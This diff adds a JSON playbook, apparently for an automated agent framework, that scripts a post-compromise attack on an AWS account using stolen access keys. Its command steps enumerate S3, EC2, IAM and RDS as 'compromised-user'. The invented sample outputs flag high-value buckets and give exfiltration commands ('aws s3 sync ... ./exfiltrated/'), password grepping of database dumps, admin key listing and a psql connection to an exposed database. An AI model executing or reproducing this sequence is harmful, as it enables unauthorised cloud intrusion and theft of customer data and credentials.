@@ -1,0 +1,133 @@
+{
+  "name": "aws_enumeration",
+  "description": "AWS cloud reconnaissance and enumeration using AWS CLI and specialized tools",
+  "pattern": "aws.*enum|aws.*recon|cloud.*enum|s3.*bucket",
+  "parameters": [
+    "access_key",
+    "secret_key",
+    "region"
+  ],
+  "sequence": [
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aws",
+        "args": [
+          "configure",
+          "list"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "      Name                    Value             Type    Location\n      ----                    -----             ----    --------\n   profile                <not set>             None    None\naccess_key     ******************** shared-credentials-file    \nsecret_key     ******************** shared-credentials-file    \n    region                us-east-1      config-file    ~/.aws/config\n\nAWS CLI configured:\n  Access Key: AKIA... (configured)\n  Secret Key: **** (configured)\n  Region: us-east-1 (default)\n  \nCredentials location:\n  ~/.aws/credentials (access keys)\n  ~/.aws/config (region, output format)\n  \nTest credentials:\n  aws sts get-caller-identity"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aws",
+        "args": [
+          "sts",
+          "get-caller-identity"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "{\n    \"UserId\": \"AIDAI23ABC456DEF789GH\",\n    \"Account\": \"123456789012\",\n    \"Arn\": \"arn:aws:iam::123456789012:user/compromised-user\"\n}\n\nIdentity confirmed:\n  User ID: AIDAI23ABC456DEF789GH\n  Account: 123456789012\n  ARN: arn:aws:iam::123456789012:user/compromised-user\n  User: compromised-user\n  Type: IAM User (not assumed role)\n  \nThis tells us:\n  - Credentials are valid\n  - Account number (123456789012)\n  - Username (compromised-user)\n  - Not using temporary credentials\n  \nNext: Enumerate permissions"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aws",
+        "args": [
+          "s3",
+          "ls"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "2023-05-12 10:23:45 prod-application-data\n2023-08-15 14:30:22 backup-database-dumps\n2023-09-01 09:15:33 customer-uploads\n2023-10-20 16:42:18 logs-cloudtrail\n2023-11-05 11:28:47 sensitive-documents\n2024-01-03 13:55:29 dev-test-bucket\n\nS3 buckets enumerated:\n  Total: 6 buckets\n  \nHigh-value targets:\n  - backup-database-dumps (potential credentials)\n  - sensitive-documents (PII, confidential data)\n  - customer-uploads (user data)\n  - logs-cloudtrail (audit logs, may contain secrets)\n  \nLow-risk:\n  - dev-test-bucket (development)\n  - prod-application-data (need to investigate)\n  \nNext steps:\n  - List bucket contents: aws s3 ls s3://backup-database-dumps\n  - Download sensitive data: aws s3 sync s3://bucket ./exfil/\n  - Check bucket policies: aws s3api get-bucket-policy --bucket bucket-name"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aws",
+        "args": [
+          "s3",
+          "ls",
+          "s3://backup-database-dumps",
+          "--recursive"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "2024-01-15 02:00:15  4294967296 mysql-prod-2024-01-15.sql.gz\n2024-01-14 02:00:22  4194304000 mysql-prod-2024-01-14.sql.gz\n2024-01-13 02:00:18  4095324160 mysql-prod-2024-01-13.sql.gz\n2024-01-15 03:30:45    52428800 postgres-analytics-2024-01-15.dump\n2024-01-15 04:15:33     1048576 mongodb-users-2024-01-15.bson\n2024-01-10 01:00:00   524288000 customer-data-archive.tar.gz\n\nDatabase backups discovered:\n  MySQL production: Daily backups ~4GB each\n    - mysql-prod-2024-01-15.sql.gz (latest)\n    - Contains: User accounts, orders, payments\n  \n  PostgreSQL analytics: 50MB\n    - postgres-analytics-2024-01-15.dump\n    - Analytics data, possibly including PII\n  \n  MongoDB users: 1MB\n    - mongodb-users-2024-01-15.bson\n    - User collection (credentials!)\n  \n  Archive:\n    - customer-data-archive.tar.gz (500MB)\n    - Historical customer data\n  \nTotal data: ~12.5 GB\n  \nExfiltration command:\n  aws s3 sync s3://backup-database-dumps ./exfiltrated/ --no-sign-request\n  \nExtract credentials from dumps:\n  gunzip mysql-prod-2024-01-15.sql.gz\n  grep -i \"password\" mysql-prod-2024-01-15.sql"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aws",
+        "args": [
+          "ec2",
+          "describe-instances"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "{\n    \"Reservations\": [\n        {\n            \"Instances\": [\n                {\n                    \"InstanceId\": \"i-0abc123def456789a\",\n                    \"InstanceType\": \"t3.large\",\n                    \"State\": {\"Name\": \"running\"},\n                    \"PrivateIpAddress\": \"10.0.1.50\",\n                    \"PublicIpAddress\": \"54.123.45.67\",\n                    \"Tags\": [{\"Key\": \"Name\", \"Value\": \"production-web-server\"}],\n                    \"SecurityGroups\": [{\"GroupName\": \"web-sg\", \"GroupId\": \"sg-12345\"}],\n                    \"KeyName\": \"prod-ssh-key\"\n                },\n                {\n                    \"InstanceId\": \"i-1bcd234efa567890b\",\n                    \"InstanceType\": \"t3.xlarge\",\n                    \"State\": {\"Name\": \"running\"},\n                    \"PrivateIpAddress\": \"10.0.2.100\",\n                    \"PublicIpAddress\": \"52.98.76.54\",\n                    \"Tags\": [{\"Key\": \"Name\", \"Value\": \"database-master\"}],\n                    \"SecurityGroups\": [{\"GroupName\": \"db-sg\", \"GroupId\": \"sg-67890\"}],\n                    \"KeyName\": \"prod-ssh-key\"\n                }\n            ]\n        }\n    ]\n}\n\nEC2 instances discovered:\n  Total: 2 running instances\n  \n  1. production-web-server (i-0abc123def456789a)\n     Type: t3.large\n     Public IP: 54.123.45.67\n     Private IP: 10.0.1.50\n     SSH Key: prod-ssh-key\n     Security Group: web-sg\n  \n  2. database-master (i-1bcd234efa567890b)\n     Type: t3.xlarge\n     Public IP: 52.98.76.54\n     Private IP: 10.0.2.100\n     SSH Key: prod-ssh-key\n     Security Group: db-sg\n  \nNext steps:\n  - Check security groups: aws ec2 describe-security-groups --group-ids sg-12345\n  - Get SSH keys: aws ec2 describe-key-pairs\n  - Check for public snapshots: aws ec2 describe-snapshots --owner-ids 123456789012\n  - User data scripts: aws ec2 describe-instance-attribute --instance-id i-0abc... --attribute userData"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aws",
+        "args": [
+          "iam",
+          "list-users"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "{\n    \"Users\": [\n        {\n            \"UserName\": \"admin\",\n            \"UserId\": \"AIDAI11AAA111AAA111A\",\n            \"Arn\": \"arn:aws:iam::123456789012:user/admin\",\n            \"CreateDate\": \"2022-03-15T10:23:45Z\"\n        },\n        {\n            \"UserName\": \"developer\",\n            \"UserId\": \"AIDAI22BBB222BBB222B\",\n            \"Arn\": \"arn:aws:iam::123456789012:user/developer\",\n            \"CreateDate\": \"2022-08-20T14:30:00Z\"\n        },\n        {\n            \"UserName\": \"backup-service\",\n            \"UserId\": \"AIDAI33CCC333CCC333C\",\n            \"Arn\": \"arn:aws:iam::123456789012:user/backup-service\",\n            \"CreateDate\": \"2023-01-10T09:15:22Z\"\n        },\n        {\n            \"UserName\": \"compromised-user\",\n            \"UserId\": \"AIDAI23ABC456DEF789GH\",\n            \"Arn\": \"arn:aws:iam::123456789012:user/compromised-user\",\n            \"CreateDate\": \"2023-06-05T11:42:18Z\"\n        }\n    ]\n}\n\nIAM users enumerated:\n  Total: 4 users\n  \n  1. admin - Administrator account\n  2. developer - Development access\n  3. backup-service - Service account (potential high privileges)\n  4. compromised-user - Our current user\n  \nNext: Enumerate policies and groups\n  aws iam list-attached-user-policies --user-name admin\n  aws iam list-groups-for-user --user-name admin\n  aws iam list-access-keys --user-name admin"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aws",
+        "args": [
+          "rds",
+          "describe-db-instances"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "{\n    \"DBInstances\": [\n        {\n            \"DBInstanceIdentifier\": \"production-mysql\",\n            \"DBInstanceClass\": \"db.t3.large\",\n            \"Engine\": \"mysql\",\n            \"EngineVersion\": \"8.0.32\",\n            \"Endpoint\": {\n                \"Address\": \"production-mysql.abc123.us-east-1.rds.amazonaws.com\",\n                \"Port\": 3306\n            },\n            \"MasterUsername\": \"admin\",\n            \"PubliclyAccessible\": false,\n            \"StorageEncrypted\": true,\n            \"DBSubnetGroup\": {\"VpcId\": \"vpc-12345\"},\n            \"VpcSecurityGroups\": [{\"VpcSecurityGroupId\": \"sg-db-001\"}]\n        },\n        {\n            \"DBInstanceIdentifier\": \"analytics-postgres\",\n            \"DBInstanceClass\": \"db.t3.medium\",\n            \"Engine\": \"postgres\",\n            \"EngineVersion\": \"14.7\",\n            \"Endpoint\": {\n                \"Address\": \"analytics-postgres.xyz789.us-east-1.rds.amazonaws.com\",\n                \"Port\": 5432\n            },\n            \"MasterUsername\": \"postgres\",\n            \"PubliclyAccessible\": true,\n            \"StorageEncrypted\": false,\n            \"VpcSecurityGroups\": [{\"VpcSecurityGroupId\": \"sg-db-002\"}]\n        }\n    ]\n}\n\nRDS databases discovered:\n  Total: 2 databases\n  \n  1. production-mysql\n     Engine: MySQL 8.0.32\n     Instance: db.t3.large\n     Endpoint: production-mysql.abc123.us-east-1.rds.amazonaws.com:3306\n     Master user: admin\n     Public: No (internal only)\n     Encrypted: Yes\n  \n  2. analytics-postgres ⚠️ VULNERABLE\n     Engine: PostgreSQL 14.7\n     Instance: db.t3.medium\n     Endpoint: analytics-postgres.xyz789.us-east-1.rds.amazonaws.com:5432\n     Master user: postgres\n     Public: YES (exposed to internet)\n     Encrypted: NO\n  \nSecurity issues:\n  analytics-postgres is publicly accessible!\n  No encryption at rest\n  \nAttempt connection:\n  psql -h analytics-postgres.xyz789.us-east-1.rds.amazonaws.com -U postgres -d analytics\n  \nCheck snapshots:\n  aws rds describe-db-snapshots --db-instance-identifier production-mysql"
+      }
+    }
+  ],
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
+  "created_by": "neural_mesh_v5.2_generator"
+}
